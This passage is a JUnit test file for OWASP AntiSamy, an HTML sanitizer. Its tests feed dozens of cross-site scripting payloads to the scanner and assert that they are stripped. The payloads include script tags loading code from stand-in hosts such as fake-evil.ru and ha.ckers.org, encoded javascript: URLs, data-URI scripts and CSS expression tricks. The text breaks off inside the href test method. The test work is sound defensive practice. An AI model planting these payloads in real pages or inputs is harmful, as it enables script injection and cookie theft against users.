/*
 * Copyright (c) 2007-2021, Arshan Dabirsiaghi, Jason Li
 *
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification,
 * are permitted provided that the following conditions are met:
 *
 * Redistributions of source code must retain the above copyright notice, this list
 * of conditions and the following disclaimer.  Redistributions in binary form must
 * reproduce the above copyright notice, this list of conditions and the following
 * disclaimer in the documentation and/or other materials provided with the distribution.
 * Neither the name of OWASP nor the names of its contributors may be used to endorse
 * or promote products derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package org.owasp.validator.html.test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.CoreMatchers.equalTo;
import static org.hamcrest.CoreMatchers.is;
import static org.hamcrest.CoreMatchers.not;
import static org.hamcrest.MatcherAssert.assertThat;

import org.junit.Before;
import org.junit.Test;

import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;
import java.io.StringWriter;
import java.io.Writer;
import java.net.URL;
import java.util.Collections;
import java.util.concurrent.ExecutionException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.codec.binary.Base64;

import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.CleanResults;
import org.owasp.validator.html.Policy;
import org.owasp.validator.html.PolicyException;
import org.owasp.validator.html.ScanException;
import org.owasp.validator.html.model.Attribute;
import org.owasp.validator.html.model.Tag;

/**
 * This class tests AntiSamy functionality and the basic policy file which
 * should be immune to XSS and CSS phishing attacks.
 * 
 * The test cases titled issue##() map to the issues identified in the original AntiSamy 
 * source code repo at: https://code.google.com/archive/p/owaspantisamy/issues.
 * 
 * The test cases titled githubIssue##() map to the issues documented at: 
 *     https://github.com/nahsra/antisamy/issues
 *
 * @author Arshan Dabirsiaghi
 */

public class AntiSamyTest {

    private static final String[] BASE64_BAD_XML_STRINGS = new String[]{
            // first string is
            // "<a - href=\"http://www.owasp.org\">click here</a>"
            "PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=",
            // the rest are randomly generated 300 byte sequences which generate
            // parser errors, turned into Strings
            "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",
    };

    private AntiSamy as = new AntiSamy();
    private TestPolicy policy = null;

    @Before
    public void setUp() throws Exception {

        /*
         * Load the policy. You may have to change the path to find the Policy
         * file for your environment.
         */

        //get Policy instance from a URL.
        URL url = getClass().getResource("/antisamy.xml");
        policy = TestPolicy.getInstance(url);
    }

    @Test
    public void SAX() {
        try {
            CleanResults cr = as.scan("<b>test</i></b>test thsidfshidf<script>sdfsdf", policy, AntiSamy.SAX);
            assertTrue(cr != null && cr.getCleanXMLDocumentFragment() == null && cr.getCleanHTML().length() > 0);
        } catch (ScanException | PolicyException e) {
            e.printStackTrace();
        }
    }

    /*
     * Test basic XSS cases.
     */

    @Test
    public void scriptAttacks() throws ScanException, PolicyException {
    	
        assertTrue(!as.scan("test<script>alert(document.cookie)</script>", policy, AntiSamy.DOM).getCleanHTML().contains("script"));
        assertTrue(!as.scan("test<script>alert(document.cookie)</script>", policy, AntiSamy.SAX).getCleanHTML().contains("script"));

        assertTrue(!as.scan("<<<><<script src=http://fake-evil.ru/test.js>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<<<><<script src=http://fake-evil.ru/test.js>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<script<script src=http://fake-evil.ru/test.js>>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<script<script src=http://fake-evil.ru/test.js>>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy, AntiSamy.DOM).getCleanHTML().contains("onload"));
        assertTrue(!as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy, AntiSamy.SAX).getCleanHTML().contains("onload"));

        assertTrue(!as.scan("<BODY ONLOAD=alert('XSS')>", policy, AntiSamy.DOM).getCleanHTML().contains("alert"));
        assertTrue(!as.scan("<BODY ONLOAD=alert('XSS')>", policy, AntiSamy.SAX).getCleanHTML().contains("alert"));

        assertTrue(!as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy, AntiSamy.DOM).getCleanHTML().contains("<iframe"));
        assertTrue(!as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy, AntiSamy.SAX).getCleanHTML().contains("<iframe"));

        assertTrue(!as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML().contains("src"));
        assertTrue(!as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML().contains("src"));

        as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>", policy, AntiSamy.DOM);
        as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>", policy, AntiSamy.SAX);
    }

    @Test
    public void imgAttacks() throws ScanException, PolicyException {

        assertTrue(as.scan("<img src=\"http://www.myspace.com/img.gif\"/>", policy, AntiSamy.DOM).getCleanHTML().contains("<img"));
        assertTrue(as.scan("<img src=\"http://www.myspace.com/img.gif\"/>", policy, AntiSamy.SAX).getCleanHTML().contains("<img"));

        assertTrue(!as.scan("<img src=javascript:alert(document.cookie)>", policy, AntiSamy.DOM).getCleanHTML().contains("<img"));
        assertTrue(!as.scan("<img src=javascript:alert(document.cookie)>", policy, AntiSamy.SAX).getCleanHTML().contains("<img"));

        assertTrue(!as.scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", policy, AntiSamy.DOM).getCleanHTML().contains("<img"));
        assertTrue(!as.scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<img"));

        assertTrue(!as.scan(
                        "<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>",
                        policy, AntiSamy.DOM).getCleanHTML().contains("<img"));
        assertTrue(!as.scan(
                        "<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>",
                        policy, AntiSamy.SAX).getCleanHTML().contains("<img"));

        assertTrue(!as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML().contains("alert"));
        assertTrue(!as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML().contains("alert"));

        String s = as.scan(
                        "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
                        policy, AntiSamy.DOM).getCleanHTML();
        assertTrue(s.length() == 0 || s.contains("&amp;"));
        s = as.scan( "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
                        policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(s.length() == 0 || s.contains("&amp;"));

        as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", policy, AntiSamy.DOM);
        as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", policy, AntiSamy.SAX);

        assertTrue(!as.scan("<IMG SRC=\"javascript:alert('XSS')\"", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<IMG SRC=\"javascript:alert('XSS')\"", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));
    }

    @Test
    public void hrefAttacks() throws ScanException, PolicyException {

        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML().contains("href"));
        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML().contains("href"));

        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy, AntiSamy.DOM).getCleanHTML().contains("href"));
        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy, AntiSamy.SAX).getCleanHTML().contains("href"));

        assertTrue(!as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy, AntiSamy.DOM).getCleanHTML().contains("ha.ckers.org"));
        assertTrue(!as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy, AntiSamy.SAX).getCleanHTML().contains("ha.ckers.org"));

        assertTrue(!as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy, AntiSamy.DOM).getCleanHTML().contains("ha.ckers.org"));
        assertTrue(!as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy, AntiSamy.SAX).getCleanHTML().contains("ha.ckers.org"));

        assertTrue(!as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy, AntiSamy.DOM).getCleanHTML().contains("vbscript"));
        assertTrue(!as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy, AntiSamy.SAX).getCleanHTML().contains("vbscript"));

        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML().contains("<meta"));
        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML().contains("<meta"));

        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML().contains("<meta"));
        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML().contains("<meta"));

        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy, AntiSamy.DOM).getCleanHTML().contains("<meta"));
        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy, AntiSamy.SAX).getCleanHTML().contains("<meta"));

        assertTrue(!as.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy, AntiSamy.DOM).getCleanHTML().contains("iframe"));
        assertTrue(!as.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy, AntiSamy.SAX).getCleanHTML().contains("iframe"));

        assertTrue(!as.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.DOM).getCleanHTML().contains("background"));
        assertTrue(!as.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.SAX).getCleanHTML().contains("background"));

        assertTrue(!as.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.DOM).getCleanHTML().contains("background"));
        assertTrue(!as.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.SAX).getCleanHTML().contains("background"));

        assertTrue(!as.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy, AntiSamy.DOM).getCleanHTML().contains("alert"));
        assertTrue(!as.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy, AntiSamy.SAX).getCleanHTML().contains("alert"));

        assertTrue(!as.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy, AntiSamy.DOM).getCleanHTML().contains("alert"));
        assertTrue(!as.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy, AntiSamy.SAX).getCleanHTML().contains("alert"));

        assertTrue(!as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy, AntiSamy.DOM).getCleanHTML().contains("ript:alert"));
        assertTrue(!as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy, AntiSamy.SAX).getCleanHTML().contains("ript:alert"));

        assertTrue(!as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy, AntiSamy.DOM).getCleanHTML().contains("<base"));
        assertTrue(!as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy, AntiSamy.SAX).getCleanHTML().contains("<base"));

        assertTrue(!as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy, AntiSamy.DOM).getCleanHTML().contains("<object"));
        assertTrue(!as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy, AntiSamy.SAX).getCleanHTML().contains("<object"));

        assertTrue(!as.scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));

        CleanResults cr = as.scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy, AntiSamy.SAX);
        // System.out.println(cr.getErrorMessages().get(0));
        assertTrue(!cr.getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy, AntiSamy.DOM).getCleanHTML().contains("<embed"));
        assertTrue(!as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy, AntiSamy.SAX).getCleanHTML().contains("<embed"));

        assertTrue(!as.scan(
                        "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
                        policy, AntiSamy.DOM).getCleanHTML().contains("<embed"));
        assertTrue(!as.scan(
                        "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
                        policy, AntiSamy.SAX).getCleanHTML().contains("<embed"));

        assertTrue(!as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

